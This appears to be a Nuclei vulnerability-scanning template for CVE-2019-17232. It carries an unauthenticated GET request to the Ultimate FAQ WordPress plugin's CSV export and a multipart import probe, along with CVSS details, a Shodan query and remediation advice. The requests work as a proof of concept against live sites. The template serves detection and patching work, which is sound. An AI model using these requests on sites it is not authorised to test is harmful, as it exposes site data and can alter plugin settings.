id: CVE-2019-17232

info:
  name: WordPress Ultimate FAQ <= 1.8.24 - Export/Import Unauth PoC (CVE-2019-17232)
  author: Khalid6468
  severity: high
  description: |
    Ultimate FAQ (ultimate-faqs) <= 1.8.24 exposes import/export actions without nonce/capability checks. This template confirms exploitability primarily via the CSV export behavior. It also includes a non-destructive unauth import probe.
    Version behavior:
    - <=1.8.24: Export works unauth, Import gets 302 unauth
    - 1.8.25-1.9.0: Export gets 302 unauth, Import works with auth (incomplete fix)
    - 1.9.1+: Both properly protected (complete fix)
  remediation: Update to Ultimate FAQ 1.8.25 or later
  reference:
    - https://blog.nintechnet.com/unauthenticated-options-import-vulnerability-in-wordpress-ultimate-faq-plugin/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 7.5
    cve-id: CVE-2019-17232
    cwe-id: CWE-306
    epss-score: 0.00698
    epss-percentile: 0.71074
    cpe: cpe:2.3:a:etoilewebdesign:ultimate_faq:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: etoilewebdesign
    product: ultimate-faqs
    affected_version: "<= 1.8.24"
    shodan-query: http.component:"ultimate-faqs"
  tags: cve,cve2019,wordpress,wp-plugin,ultimate-faq,export,optional-auth,etoilewebdesign

variables:
  cookie: ""

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=EWD-UFAQ-Options&DisplayPage=Export&Action=EWD_UFAQ_ExportToSpreadsheet"
    headers:
      Cookie: "{{cookie}}"

    redirects: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "\"Question\",\"Answer\",\"Categories\",\"Tags\",\"Post Date\""

      - type: status
        status:
          - 200

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=EWD-UFAQ-Options&DisplayPage=ImportPosts&Action=EWD_UFAQ_ImportFaqsFromSpreadsheet"

    headers:
      Cookie: "{{cookie}}"
      Content-Type: multipart/form-data; boundary=----nuclei

    body: |
      ------nuclei
      Content-Disposition: form-data; name="FAQs_Spreadsheet"; filename="hosts.txt"
      Content-Type: text/plain

      nuclei
      ------nuclei--

    matchers:
      - type: word
        part: body
        words:
          - "File must be .csv, .xls or .xlsx"